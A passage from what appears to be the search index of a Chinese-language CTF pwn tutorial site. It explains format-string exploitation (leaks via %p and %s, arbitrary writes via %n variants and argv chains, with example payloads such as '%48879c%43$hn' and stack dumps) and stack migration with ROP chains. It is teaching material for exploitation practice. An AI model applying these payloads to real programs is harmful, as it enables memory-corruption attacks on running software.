\u9019\u908a\u518d\u5beb\u5165\u7684\u6642\u5019\uff0c\u5982\u679c\u8981\u5beb\u5f97\u503c\u592a\u5927\uff0c\u4e00\u6a23\u8981\u50cf\u524d\u9762\u4e00\u6a23\u5206\u6210\u591a\u6bb5\u4f86\u5beb\uff0c\u800c\u9019\u500b\u7bc4\u4f8b\u53ea\u8981\u5beb\u5165 0x4 \u6240\u4ee5\u5c31\u76f4\u63a5\u5beb\u5c31\u597d\u4e86 %4c%114$lln \u5beb\u5b8c\u5f8c\uff0c 0xdeadbeef \u5b58\u7684\u503c\u5c31\u6703\u88ab\u6539\u6389\u4e86 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0xdeadbeef --> 0x4 \u9019\u984c\u7bc4\u4f8b\u70ba\u4e86\u8b1b\u89e3\u65b9\u4fbf\uff0c\u6240\u4ee5\u4e00\u6b21\u90fd\u5beb 2 bytes\uff0c\u5efa\u8b70\u662f\u4e00\u6b21\u5beb 1 byte \u7528 for \u8ff4\u5708\u81ea\u52d5\u79fb\u52d5\u5b8c\u6210\u5373\u53ef _printf_chk \u6709\u6642\u5019\u6703\u9047\u5230\u4f7f\u7528\u7684\u662f _printf_chk \u800c\u975e printf \uff0c\u5176\u5be6\u9019\u5169\u500b\u5dee\u4e0d\u591a\uff0c\u53ea\u4e0d\u904e _printf_chk \u591a\u4e86\u4ee5\u4e0b\u9650\u5236 \u4e0d\u80fd\u7528 %n \u7cfb\u5217\u5beb\u503c \u4e0d\u80fd\u7528 %x$y \u6307\u5b9a\u53c3\u6578","title":"Format String"},{"location":"pwn/format_string/#format-string","text":"format string \u662f\u5728\u4f7f\u7528 printf \u4e0a\u7684\u4e00\u500b\u6f0f\u6d1e\uff0c\u57fa\u672c\u4e0a\u597d\u50cf\u53ea\u6703\u5728\u6253\u984c\u76ee\u7684\u6642\u5019\u51fa\u73fe XD \u4ee5\u4e0b\u662f\u7d93\u5178\u7684 format string \u7bc4\u4f8b char buf [ 50 ]; scanf ( \"%s\" , buf ); printf ( buf ); \u539f\u672c\u61c9\u8a72\u7531\u958b\u767c\u8005\u586b\u5beb\u7684 format \u8b8a\u6210\u4f7f\u7528\u8005\u53ef\u63a7\u7684\uff0c\u53ef\u4ee5\u85c9\u7531\u9019\u6a23\u7684\u6f0f\u6d1e\u9054\u5230\u4efb\u610f\u8b80\u53d6\u53ca\u4efb\u610f\u5beb\u5165\u7684\u64cd\u4f5c","title":"Format String"},{"location":"pwn/format_string/#printf","text":"\u4e00\u958b\u59cb\u8981\u5148\u8b1b\u7684\u662f printf \u7684\u53c3\u6578\uff0c\u5728 amd64 \u7684\u60c5\u6cc1\u4e0b\uff0c\u5982\u679c\u53c3\u6578\u6c92\u6709\u8d85\u904e 6 \u500b\u7684\u8a71\u6703\u653e\u5728 register \u4e0a\uff0c\u7b2c 7 \u500b\u958b\u59cb\u624d\u653e\u5728 stack \u4e0a rdi \u2192 rsi \u2192 rdx \u2192 rcx \u2192 r8 \u2192 r9 \u2192 stack \u6b63\u5e38\u4f7f\u7528 printf \u6642\uff1a printf ( \"%d%c%s\" , a , b , c ); | | | | rdi rsi rdx rcx \u5728\u4f7f\u7528 fromat string \u6642\uff0c rdi \u662f\u81ea\u5df1\u7684 payload\uff0c\u800c\u7b2c\u4e00\u500b % \u4ee3\u8868\u7684\u662f rsi \uff0c\u5982\u679c\u60f3\u8981\u52d5\u5230 stack \u4e0a\u7684\u6771\u897f\u5c31\u8981\u5f9e\u7b2c 6 \u500b % \u958b\u59cb","title":"printf \u53c3\u6578"},{"location":"pwn/format_string/#_1","text":"\u53ef\u4ee5\u4f7f\u7528 %x$y \u76f4\u63a5\u6307\u5b9a\u7b2c\u5e7e\u500b\u53c3\u6578\uff0c\u9019\u908a\u7684 x \u662f\u7b2c\u5e7e\u500b\u53c3\u6578\uff0c y \u5247\u662f\u8981\u4f7f\u7528\u7684\u65b9\u6cd5 % 2 $ p // \u5370\u51fa rdx (\u7b2c 2 \u500b\u53c3\u6578) % 3 $ n // \u5beb\u5165 rcx (\u7b2c 3 \u500b\u53c3\u6578)","title":"\u76f4\u63a5\u6307\u5b9a\u53c3\u6578"},{"location":"pwn/format_string/#_2","text":"\u8b80\u53d6\u7684\u90e8\u5206\u4e3b\u8981\u53ef\u4ee5\u6709 %p \u4ee5\u53ca %s \u5169\u7a2e\u505a\u6cd5\uff0c %p \u53ef\u4ee5\u7528\u4f86\u8b80\u53d6 register \u4ee5\u53ca stack \u4e0a\u7684\u503c\uff0c\u800c %s \u5247\u53ef\u4ee5\u505a\u5230\u4efb\u610f\u8b80\u53d6","title":"\u8b80\u53d6"},{"location":"pwn/format_string/#p","text":"\u5728\u8b80\u53d6\u6642\u4f7f\u7528\u7684\u662f %p \uff0c\u53ef\u4ee5\u7528 16 \u9032\u4f4d\u5370\u51fa\u67d0\u500b register (stack \u67d0\u4f4d\u7f6e) \u5b58\u7684\u503c\uff0c\u4ee5\u4e0b\u4f86\u500b\u7bc4\u4f8b \u9019\u908a\u8f38\u5165\u7684 payload \u662f %p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p \u8f38\u51fa\u5982\u4e0b 0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0 | | | | | | | | | rsi rdx rcx r8 r9 rsp rsp + 0x8 rsp + 0x10 rsp + 0x18 \u5047\u8a2d\u60f3\u8981\u5370\u51fa rsp + 0x28 \u7684\u503c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 $ \u4f86\u6307\u5b9a %10$p -> 0x400070","title":"%p"},{"location":"pwn/format_string/#s","text":"%s \u8ddf %p \u8b80\u53d6\u7684\u76ee\u6a19\u4e0d\u4e00\u6a23\uff0c %s \u662f\u628a\u5b58\u7684\u503c\u7576\u6210\u6307\u6a19\u53bb\u8b80\u53d6\uff0c\u800c %p \u662f\u628a\u5b58\u7684\u503c\u76f4\u63a5\u9001\u51fa\u4f86 \u5728\u6b63\u5e38\u4f7f\u7528 %s \u6642\uff0c\u653e\u5165\u7684\u53c3\u6578\u662f\u67d0\u500b\u5b57\u4e32\u7684\u6307\u6a19\uff0c printf \u6703\u628a\u6307\u6a19\u6240\u6307\u7684\u5730\u65b9\u7576\u6210\u5b57\u4e32\u5370\u51fa char str [] = \"Hello World!\" ; printf ( \"%s\" , str ); // Hello World! \u9019\u7a2e\u6a5f\u5236\u5c31\u53ef\u4ee5\u7528\u4f86\u4efb\u610f\u8b80\u53d6\uff0c\u5047\u8a2d\u8f38\u5165\u7684 payload \u5728 stack \u4e0a\u7684\u8a71\uff0c\u53ef\u4ee5\u628a\u60f3\u8981\u5370\u51fa\u7684\u4f4d\u5740\u5beb\u5728 payload \u4e0a\uff0c\u63a5\u8457\u4f7f\u7528 %s \u53bb\u8b80\u51fa\u4f86\uff0c\u4ee5\u4e0b\u662f\u7bc4\u4f8b \u9019\u6642\u5019\u7684\u8f38\u5165\u5982\u4e0b\uff0c aaaa \u7684\u90e8\u5206\u662f\u70ba\u4e86\u628a\u8981\u5370\u7684\u4f4d\u5740\u63a8\u5230 rsp + 0x8 \uff0c\u9019\u6a23 rsp + 0x8 \u5c31\u6703\u525b\u597d\u662f 0x6262626262626262 (\"bbbbbbbb\") %7$saaaabbbbbbbb \u5728\u57f7\u884c printf \u6642\u6703\u53bb\u6293 0x6262626262626262 \u6240\u5b58\u7684\u503c\u4e26\u7576\u6210\u5b57\u4e32\u5370\u51fa\uff0c\u4e0d\u904e\u9019\u6b21\u7684\u7bc4\u4f8b\u6c92\u6709\u9019\u500b\u4f4d\u5740\uff0c\u6240\u4ee5\u6703\u5931\u6557","title":"%s"},{"location":"pwn/format_string/#_3","text":"printf \u4f7f\u7528 %n \u6642\u53ef\u4ee5\u5beb\u5165\u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u66f4\u8fd1\u4e00\u6b65\u4f7f\u7528 argv chain \u4f86\u9054\u6210\u4efb\u610f\u4f4d\u5740\u5beb\u5165 %n \u8ddf %s \u985e\u4f3c\uff0c\u4e00\u6a23\u662f\u628a\u5b58\u7684\u503c\u7576\u6210\u6307\u6a19\uff0c %s \u5c07\u6307\u6a19\u6307\u7684\u4f4d\u7f6e\u8b80\u51fa\u4f86\uff0c\u800c %n \u5247\u662f\u628a\u6578\u503c\u5beb\u5165\u6307\u6a19\u6240\u6307\u7684\u4f4d\u7f6e \u5047\u8a2d stack \u4e0a\u7684 rsp + 0x10 \u5982\u4e0b\uff0c\u7528 %8$n \u5beb\u5165\u9019\u683c\u6642\uff0c\u5be6\u969b\u4e0a\u6703\u5beb\u5230 0x7ffff7fea000 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f \u5982\u679c\u662f\u5beb 0xdeadbeef \u7684\u8a71\uff0c\u9019\u6bb5\u5c31\u6703\u8b8a\u6210 0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fffdeadbeef","title":"\u5beb\u5165"},{"location":"pwn/format_string/#_4","text":"\u5beb\u5165\u7684\u503c\u662f\u5728\u9047\u5230 %n \u524d\u7e3d\u5171\u5370\u4e86\u5e7e\u500b\u5b57\u5143 \u4f8b\u5982 payload \u5982\u4e0b\uff0c %n \u524d\u6709 8 \u500b a \uff0c\u6240\u4ee5\u6703\u5beb 8 \u5230\u6307\u5b9a\u7684\u4f4d\u7f6e aaaaaaaa%n \u5982\u679c\u6709\u591a\u500b %n \u7684\u8a71\u5c31\u8981\u770b\u524d\u9762\u5230\u5e95\u591a\u9577 \u4f8b\u5982 payload \u5982\u4e0b\uff0c\u7b2c\u4e00\u500b %n \u524d\u6709 8 \u500b a \uff0c\u6703\u5beb 8 \u5230 rsp \u6307\u7684\u4f4d\u7f6e\uff0c\u800c\u7b2c\u4e8c\u500b %n \u524d\u6709 8 \u500b a \u4ee5\u53ca 8 \u500b b \uff0c\u5171 16 \u5b57\u5143\uff0c\u6240\u4ee5\u6703\u5beb 16 \u5230 rsp + 8 \u6240\u6307\u7684\u4f4d\u7f6e aaaaaaaa%6$nbbbbbbbb%7$n \u4e0d\u904e\u9019\u6a23\u5beb\u5165\u8981\u6253\u5f88\u4e45\uff0c\u9019\u6642\u5019\u53ef\u4ee5\u7528\u5230 %c \u4f86\u69cb\u6210 payload \u5148\u4f86\u770b\u770b %c \u7684\u7528\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u8981\u5370\u51fa\u7684\u9577\u5ea6 // input char ch = 'a' printf ( \"%3c\" ); printf ( \"%5c\" ); // output \" a\" \" a\" \u5229\u7528 %c \u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u7684\u7bc4\u4f8b\uff0c\u53ef\u4ee5\u9054\u6210\u4e00\u6a23\u7684\u6548\u679c %8c%6$n%8c%7$n","title":"\u5beb\u5165\u7684\u503c"},{"location":"pwn/format_string/#_5","text":"\u4e0a\u9762\u96d6\u7136\u90fd\u7528 %n \u4f86\u8209\u4f8b\uff0c\u4f46\u5176\u5be6\u5beb\u5165\u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u7684\u9577\u5ea6 \u683c\u5f0f \u9577\u5ea6 (byte) %lln 8 bytes %n 4 bytes %hn 2 bytes %hhn 1 byte \u4ee5\u4e00\u958b\u59cb\u7684\u4f8b\u5b50\u4f86\u8aaa 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f \u5beb aaaa%8$lln 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x4 \u5beb aaaa%8$n 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fff00000004 \u5beb aaaa%8$hn 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a00004 \u5beb aaaa%8$hhn 0016 | 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d004 \u4e00\u822c\u5728\u4f7f\u7528\u7684\u6642\u5019\uff0c\u901a\u5e38\u4e0d\u6703\u4e00\u6b21\u5beb\u5165\u6574\u6bb5\u7684\u8cc7\u6599\uff0c\u4f8b\u5982\u8981\u5beb\u5165 0xdeadbeef \u7684\u8a71\uff0c\u5c31\u5fc5\u9808\u8981\u4e00\u6b21\u5beb 3735928559 \u500b\u5b57\u5143\uff0c\u9700\u8981\u8dd1\u8d85\u4e45\u7684\uff0c\u56e0\u6b64\u6703\u914d\u5408 argv chain \u5206\u6210 0xde \u3001 0xad \u3001 0xbe \u3001 0xef \u4f86\u591a\u6b21\u5beb\u5165","title":"\u5beb\u5165\u7684\u9577\u5ea6"},{"location":"pwn/format_string/#argv-chain","text":"argv chain \u662f\u5229\u7528 stack \u4e0a\u7684 argv \u4f86\u9054\u6210\u4efb\u610f\u5beb\u5165\u7684\u529f\u80fd stack \u4e0a\u90fd\u6703\u6709\u4e00\u6bb5\u662f argv \u7684\u4f4d\u7f6e\uff0cargv chain \u4e0a\u7684\u5169\u6bb5\u4f4d\u5740\u90fd\u5728 stack \u4e0a\u4e14\u53ef\u4ee5\u63a7\u5236 0000 | 0x7fffffffe820 --> 0x333231 ( '123' ) 0008 | 0x7fffffffe828 --> 0x40073d ( <__libc_csu_init+77>: add rbx,0x1 ) 0016 | 0x7fffffffe830 --> 0x0 0024 | 0x7fffffffe838 --> 0x0 0032 | 0x7fffffffe840 --> 0x4006f0 ( <__libc_csu_init>: push r15 ) 0040 | 0x7fffffffe848 --> 0x400590 ( <_start>: xor ebp,ebp ) 0048 | 0x7fffffffe850 --> 0x7fffffffe940 --> 0x1 0056 | 0x7fffffffe858 --> 0xa0a688c62ba6ff00 0064 | 0x7fffffffe860 --> 0x4006f0 ( <__libc_csu_init>: push r15 ) 0072 | 0x7fffffffe868 --> 0x7ffff7a2d830 ( <__libc_start_main+240>: mov edi,eax ) 0080 | 0x7fffffffe870 --> 0x0 +--------------------------------------------------------------------------------------------------------------+ | 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 ( \"/home/frozenkp/challenge/format/a.out\" ) | +--------------------------------------------------------------------------------------------------------------+ 0096 | 0x7fffffffe880 --> 0x1f7ffcca0 0104 | 0x7fffffffe888 --> 0x400686 ( <main>: push rbp ) 0112 | 0x7fffffffe890 --> 0x0 0120 | 0x7fffffffe898 --> 0xc5142c5f7392e1ee 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f682f | | | rsp + 0x58 rsp + 0x128 rsp + 0x360 argv0 argv1 argv2 \u53ef\u4ee5\u900f\u904e\u5beb\u5165 argv1 \u4f86\u6539\u52d5 argv2 \u5beb\u7684\u5167\u5bb9 (address)\uff0c\u6700\u5f8c\u518d\u900f\u904e\u5beb\u5165 argv2 \u4f86\u5beb\u5165\u6307\u5b9a\u7684\u4f4d\u5740 \u4ee5\u4e0b\u7bc4\u4f8b\uff0c\u5047\u8a2d\u8981\u5728 0xdeadbeef \u5beb\u5165 0x4","title":"argv chain"},{"location":"pwn/format_string/#argv1-2-bytes","text":"\u4e00\u958b\u59cb\u5148\u5728 argv2 \u7684\u503c\u5beb\u4e0a 0xbeef \uff0cpayload \u5982\u4e0b %48879c%43$hn \u5beb\u5b8c\u5f8c\u5982\u4e0b +----+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f | beef | +----+","title":"\u7b2c\u4e00\u6b65\uff1a\u900f\u904e argv1 \u5beb 2 bytes"},{"location":"pwn/format_string/#argv0-2","text":"\u628a argv2 \u79fb\u52d5 2\uff0cpayload \u5982\u4e0b %2c%17$hhn \u5beb\u5b8c\u5f8c\u5982\u4e0b\uff0cargv2 \u5f9e 0x7fffffffeb80 \u8b8a\u6210 0x7fffffffeb82 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> 0x7a6f72662f656d6f","title":"\u7b2c\u4e8c\u6b65\uff1a\u900f\u904e argv0 \u79fb\u52d5 2"},{"location":"pwn/format_string/#argv1-2-bytes_1","text":"\u539f\u672c\u53ea\u80fd\u5beb\u4e0a 0xbeef \uff0c\u5f8c\u9762\u7684\u90e8\u5206\u900f\u904e\u7b2c\u4e8c\u6b65\u79fb\u52d5 argv2 \u4ee5\u5f8c\u5c31\u53ef\u4ee5\u7528 %hn \u78b0\u5230\u4e86 \u56e0\u70ba\u5269\u4e0b\u53ea\u8981\u5beb\u6389 0xdead \u5c31\u597d\uff0c\u6240\u4ee5\u6211\u9019\u908a\u76f4\u63a5\u4f7f\u7528 %lln \u628a\u5f8c\u9762\u90fd\u7528 0 \u84cb\u6389 %57005c%43$lln \u5beb\u5b8c\u5f8c\u5982\u4e0b +------+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> | 0xdead | +------+","title":"\u7b2c\u4e09\u6b65\uff1a\u900f\u904e argv1 \u5beb 2 bytes"},{"location":"pwn/format_string/#argv0","text":"\u628a argv2 \u79fb\u52d5\u56de\u4f86\uff0cpayload \u5982\u4e0b %17$hhn \u5beb\u5b8c\u5f8c\u5982\u4e0b\uff0c\u5206\u5169\u6bb5\u5beb\u5f8c\u5c31\u53ef\u4ee5\u628a\u6574\u500b 0xdeadbeef \u5beb\u4e0a\u53bb\u4e86 +----------+ 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> | 0xdeadbeef | +----------+","title":"\u7b2c\u56db\u6b65\uff1a\u900f\u904e argv0 \u79fb\u52d5\u56de\u4f86"},{"location":"pwn/format_string/#argv2-0xdeadbeef","text":"\u9019\u908a\u518d\u5beb\u5165\u7684\u6642\u5019\uff0c\u5982\u679c\u8981\u5beb\u5f97\u503c\u592a\u5927\uff0c\u4e00\u6a23\u8981\u50cf\u524d\u9762\u4e00\u6a23\u5206\u6210\u591a\u6bb5\u4f86\u5beb\uff0c\u800c\u9019\u500b\u7bc4\u4f8b\u53ea\u8981\u5beb\u5165 0x4 \u6240\u4ee5\u5c31\u76f4\u63a5\u5beb\u5c31\u597d\u4e86 %4c%114$lln \u5beb\u5b8c\u5f8c\uff0c 0xdeadbeef \u5b58\u7684\u503c\u5c31\u6703\u88ab\u6539\u6389\u4e86 0088 | 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0xdeadbeef --> 0x4 \u9019\u984c\u7bc4\u4f8b\u70ba\u4e86\u8b1b\u89e3\u65b9\u4fbf\uff0c\u6240\u4ee5\u4e00\u6b21\u90fd\u5beb 2 bytes\uff0c\u5efa\u8b70\u662f\u4e00\u6b21\u5beb 1 byte \u7528 for \u8ff4\u5708\u81ea\u52d5\u79fb\u52d5\u5b8c\u6210\u5373\u53ef","title":"\u7b2c\u4e94\u6b65\uff1a\u900f\u904e argv2 \u5beb\u5165 0xdeadbeef"},{"location":"pwn/format_string/#_printf_chk","text":"\u6709\u6642\u5019\u6703\u9047\u5230\u4f7f\u7528\u7684\u662f _printf_chk \u800c\u975e printf \uff0c\u5176\u5be6\u9019\u5169\u500b\u5dee\u4e0d\u591a\uff0c\u53ea\u4e0d\u904e _printf_chk \u591a\u4e86\u4ee5\u4e0b\u9650\u5236 \u4e0d\u80fd\u7528 %n \u7cfb\u5217\u5beb\u503c \u4e0d\u80fd\u7528 %x$y \u6307\u5b9a\u53c3\u6578","title":"_printf_chk"},{"location":"pwn/stack_migration/","text":"Stack Migration stack migration \u662f\u5728\u53ef\u4ee5\u8f38\u5165\u7684 ROPchain \u9577\u5ea6\u4e0d\u5920\u6642\uff0c\u53ef\u4ee5\u64f4\u5c55\u8f38\u5165\u7684\u65b9\u6cd5 \u6838\u5fc3\u6982\u5ff5\u662f\u5c07 ROPchain \u5206\u597d\u5e7e\u6b21\u5beb\u5728\u6307\u5b9a\u7684\u5340\u57df\uff0c\u6700\u5f8c\u518d\u5c07 stack \u79fb\u52d5\u904e\u53bb\u57f7\u884c leave leave \u662f stack migration \u7684\u95dc\u9375\uff0c\u5be6\u969b\u4e0a leave \u505a\u4e86\u5169\u500b\u52d5\u4f5c mov rsp, rbp pop rbp \u800c\u6bcf\u6b21\u9032\u884c buffer overflow \u6642\uff0c rbp \u662f\u53ef\u63a7\u7684\uff0c\u5728\u4e0b\u4e00\u8f2a\u6642\u4e5f\u53ef\u4ee5\u9032\u4e00\u6b65\u63a7\u5236 rsp rbp buffer overflow \u4ee5\u5f8c\uff0cstack \u4e0a\u7684\u60c5\u6cc1\u5982\u4e0b \u5728\u4e0d\u7528 stack migration \u7684\u6642\u5019\uff0crbp \u5c31\u96a8\u4fbf\u586b\u5c31\u597d\u4e86\uff0c\u53cd\u6b63\u4e4b\u5f8c\u4e0d\u6703\u7528\u5230\uff0c\u4f46\u8981\u4f7f\u7528 stack migration \u6642\uff0c\u5c31\u5fc5\u9808\u5148\u628a rbp \u6307\u5b9a\u5230\u7279\u5b9a\u7684 buffer \uff0c\u4e4b\u5f8c\u624d\u80fd\u79fb\u52d5 stack rsp AAAAAAAA rsp + 8 AAAAAAAA rsp + 16 AAAAAAAA ... ... rbp buffer \uff03 \u9019\u88e1\u662f\u539f\u672c\u7684 rbp \u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u5c31\u662f mov \u5f8c stack \u7684\u6700\u4e0a\u5c64 ret ROP gadget \u63a5\u8457\u5728\u4e0b\u4e00\u6b21\u9047\u5230 leave \u6642\uff0c mov rsp, rbp \u5c31\u6703\u5c07 stack \u6539\u5230 buffer \u4e0a\u4e86 Simple Migration \u5728\u53ef\u4ee5\u63a7\u5236\u8f38\u5165\u9577\u5ea6\u6642\uff0c\u53ef\u4ee5\u4e00\u53e3\u6c23\u5c07\u8981\u7528\u5230\u7684 gadgets \u90fd\u5beb\u4e0a buffer \u4e26\u5c07 stack \u79fb\u52d5\u904e\u53bb\u57f7\u884c\uff0c\u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a payload + buf + set_input_parameters + input_func + leave_ret | | | | +----------------------------------+ rbp ROP chain \u9019\u908a\u8981\u6ce8\u610f\u7684\u662f\uff0cinput \u8981\u6307\u5b9a\u5230 buf \u4e0a\uff0c\u4e14\u7b2c\u4e00\u500b\u5fc5\u9808\u8981\u8f38\u5165 rbp\uff0c\u5982\u679c\u6c92\u6709\u8981\u57f7\u884c\u7b2c\u4e8c\u6b21\u7684 migration \u7684\u8a71\uff0c\u5c31\u96a8\u4fbf\u586b\u5c31\u597d\u4e86 buf2 + rop_chain + [set_input_parameters + input_func + leave_ret] \u6d41\u7a0b leave\uff1a\u628a rbp \u8a2d\u5b9a\u6210 buf \u57f7\u884c input_func \u4e26\u5c07\u8f38\u5165\u8b80\u53d6\u5230 buf \u8f38\u5165\u65b0\u7684 rbp \u4ee5\u53ca ROP chain leave\uff1astack \u8df3\u8f49\u5230 buf \u4e26\u5c07 rbp \u8a2d\u6210 buf2 \u57f7\u884c ROP chain \u662f\u5426\u57f7\u884c\u4e0b\u4e00\u6b21 migration \u662f\uff1a\u8df3\u56de 2 ( buf \u548c buf2 \u5c0d\u8abf\uff0c\u591a\u6b21 migration \u5c31\u5728 buf \u548c buf2 \u4e92\u63db\u5373\u53ef) \u5426\uff1a\u7d50\u675f Fixed Size Migration \u5728\u4e0d\u80fd\u63a7\u5236\u8f38\u5165\u9577\u5ea6\u6642\uff0c\u5c31\u53ea\u80fd\u4f7f\u7528\u539f\u672c\u7684 read \u4f86\u591a\u6b21\u8f38\u5165 ROP chain \u5047\u8a2d\u6709\u4e00\u500b read \u8f38\u5165\u5f8c\u5982\u4e0b\uff0c\u53ea\u80fd\u5920\u8f38\u5165\u4e00\u500b Gadget payload (4*8 bytes) + rbp + ret \u9019\u6642\u5019\u5c31\u53ea\u80fd return \u5230\u539f\u672c\u7684 read (\u4ee5\u4e0b\u7a31 main_read ) \u4ed4\u7d30\u89c0\u5bdf\u4e00\u4e0b\u6703\u767c\u73fe main_read \u5176\u5be6\u6703\u5c07\u8f38\u5165\u5b58\u5230 rbp - 0x20 \uff0c\u53ef\u4ee5\u5229\u7528\u9019\u500b\u7279\u6027\u4f86\u5beb\u5165 ROP chain \u7b2c\u4e00\u6b21 migration \u7b2c\u4e00\u6b21\u53ea\u662f\u70ba\u4e86\u5c07 stack \u79fb\u52d5\u5230 buf \u4e0a\u800c\u5df2 payload (4*8 bytes) + buf1 + main_read leave\uff1a\u628a rbp \u8a2d\u5b9a\u6210 buf1 \u56de\u5230 main_read \u8b80\u53d6\u8f38\u5165\uff0c\u8b80\u53d6\u5230 buf1 - 0x20 leave\uff1a\u628a rsp \u8a2d\u5b9a\u6210 buf1 \uff0c rbp \u8a2d\u5b9a\u6210 buf1 \u4e0a\u5beb\u7684\u65b0 rbp \u4ea4\u66ff migration \u5beb\u5165 ROP chain \u4e00\u958b\u59cb\u662f\u5148\u9001\u7b2c\u4e00\u6b21 migration \u7684\u8f38\u5165 payload (4*8 bytes) + buf2 + main_read \uff5c | rbp - 0x20 rbp \u524d\u9762 4*8 bytes \u5c31\u96a8\u4fbf\u653e\u5c31\u597d\u4e86\uff0c\u63a5\u8457\u5c07 rbp \u8a2d\u6210 buf2 \uff0c\u7136\u5f8c\u56de\u5230 main_read \u7b2c\u4e8c\u6b21\u57f7\u884c main_read \u6642\uff0c\u6703\u628a\u8f38\u5165\u5beb\u5230 buf2 - 0x20 \uff0c\u9019\u6642\u5f8c\u8f38\u5165\uff1a data (4*8 bytes) + buf1 + main_read \uff5c | buf2 - 0x20 rbp(buf2) \u9019\u6a23\u8f38\u5165\u4ee5\u5f8c\uff0c\u5c31\u53ef\u4ee5\u628a 4*8 bytes \u7684 ROP chain \u5beb\u5165 buf2 - 0x20 \uff0c\u7136\u5f8c\u518d\u8df3\u56de buf1 \u63a5\u8457\u5c31\u91cd\u8907\u57f7\u884c\u4ee5\u4e0a\u5169\u6b65\u5c31\u53ef\u4ee5\u4e86\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u6bcf\u6b21\u90fd\u662f\u7d66 buf2 \u6703\u4e00\u76f4\u8986\u84cb\u6389\uff0c\u6240\u4ee5\u8981\u4e00\u76f4\u66f4\u65b0\u4f4d\u7f6e +-------------+------+-------------+-------------+--------------+ | buf2 - 0x20 | buf2 | buf2 + 0x20 | buf2 + 0x40 | ... | +-------------+------+-------------+-------------+--------------+ | | | | 1st 2nd 3rd 4th","title":"Stack Migration"},{"location":"pwn/stack_migration/#stack-migration","text":"stack migration \u662f\u5728\u53ef\u4ee5\u8f38\u5165\u7684 ROPchain \u9577\u5ea6\u4e0d\u5920\u6642\uff0c\u53ef\u4ee5\u64f4\u5c55\u8f38\u5165\u7684\u65b9\u6cd5 \u6838\u5fc3\u6982\u5ff5\u662f\u5c07 ROPchain \u5206\u597d\u5e7e\u6b21\u5beb\u5728\u6307\u5b9a\u7684\u5340\u57df\uff0c\u6700\u5f8c\u518d\u5c07 stack \u79fb\u52d5\u904e\u53bb\u57f7\u884c","title":"Stack Migration"},{"location":"pwn/stack_migration/#leave","text":"leave \u662f stack migration \u7684\u95dc\u9375\uff0c\u5be6\u969b\u4e0a leave \u505a\u4e86\u5169\u500b\u52d5\u4f5c mov rsp, rbp pop rbp \u800c\u6bcf\u6b21\u9032\u884c buffer overflow \u6642\uff0c rbp \u662f\u53ef\u63a7\u7684\uff0c\u5728\u4e0b\u4e00\u8f2a\u6642\u4e5f\u53ef\u4ee5\u9032\u4e00\u6b65\u63a7\u5236 rsp","title":"leave"},{"location":"pwn/stack_migration/#rbp","text":"buffer overflow \u4ee5\u5f8c\uff0cstack \u4e0a\u7684\u60c5\u6cc1\u5982\u4e0b \u5728\u4e0d\u7528 stack migration \u7684\u6642\u5019\uff0crbp \u5c31\u96a8\u4fbf\u586b\u5c31\u597d\u4e86\uff0c\u53cd\u6b63\u4e4b\u5f8c\u4e0d\u6703\u7528\u5230\uff0c\u4f46\u8981\u4f7f\u7528 stack migration \u6642\uff0c\u5c31\u5fc5\u9808\u5148\u628a rbp \u6307\u5b9a\u5230\u7279\u5b9a\u7684 buffer \uff0c\u4e4b\u5f8c\u624d\u80fd\u79fb\u52d5 stack rsp AAAAAAAA rsp + 8 AAAAAAAA rsp + 16 AAAAAAAA ... ... rbp buffer \uff03 \u9019\u88e1\u662f\u539f\u672c\u7684 rbp \u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u5c31\u662f mov \u5f8c stack \u7684\u6700\u4e0a\u5c64 ret ROP gadget \u63a5\u8457\u5728\u4e0b\u4e00\u6b21\u9047\u5230 leave \u6642\uff0c mov rsp, rbp \u5c31\u6703\u5c07 stack \u6539\u5230 buffer \u4e0a\u4e86","title":"rbp"},{"location":"pwn/stack_migration/#simple-migration","text":"\u5728\u53ef\u4ee5\u63a7\u5236\u8f38\u5165\u9577\u5ea6\u6642\uff0c\u53ef\u4ee5\u4e00\u53e3\u6c23\u5c07\u8981\u7528\u5230\u7684 gadgets \u90fd\u5beb\u4e0a buffer \u4e26\u5c07 stack \u79fb\u52d5\u904e\u53bb\u57f7\u884c\uff0c\u5177\u9ad4\u64cd\u4f5c\u5982\u4e0b\uff1a payload + buf + set_input_parameters + input_func + leave_ret | | | | +----------------------------------+ rbp ROP chain \u9019\u908a\u8981\u6ce8\u610f\u7684\u662f\uff0cinput \u8981\u6307\u5b9a\u5230 buf \u4e0a\uff0c\u4e14\u7b2c\u4e00\u500b\u5fc5\u9808\u8981\u8f38\u5165 